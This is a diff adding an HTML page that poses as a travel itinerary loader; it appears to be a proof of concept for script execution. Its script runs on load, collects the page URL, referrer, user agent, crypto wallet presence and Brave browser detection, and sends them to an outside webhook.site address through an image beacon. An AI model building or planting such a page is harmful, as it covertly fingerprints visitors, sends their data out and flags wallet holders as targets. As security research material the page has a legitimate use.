@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head><title>Travel Itinerary - Loading...</title></head>
+<body>
+  <h1>Your Personalized Travel Itinerary</h1>
+  <p>Generating your travel plan based on your preferences...</p>
+  <script>
+    // THIS JS EXECUTES when the form navigates here
+    var data = {
+      proof: 'file_opened_js_executed',
+      url: location.href,
+      protocol: location.protocol,
+      referrer: document.referrer,
+      userAgent: navigator.userAgent,
+      timestamp: new Date().toISOString()
+    };
+    
+    // Check for wallet
+    if (window.ethereum) {
+      data.hasWallet = true;
+      data.isBraveWallet = window.ethereum.isBraveWallet || false;
+    }
+    
+    // Check for Brave
+    if (navigator.brave) {
+      navigator.brave.isBrave().then(function(result) {
+        data.isBrave = result;
+        new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?opened=' + 
+          encodeURIComponent(JSON.stringify(data));
+      });
+    } else {
+      new Image().src = 'https://webhook.site/a37b5607-fb54-46c5-8615-183fcf63c253?opened=' + 
+        encodeURIComponent(JSON.stringify(data));
+    }
+  </script>
+</body>
+</html>
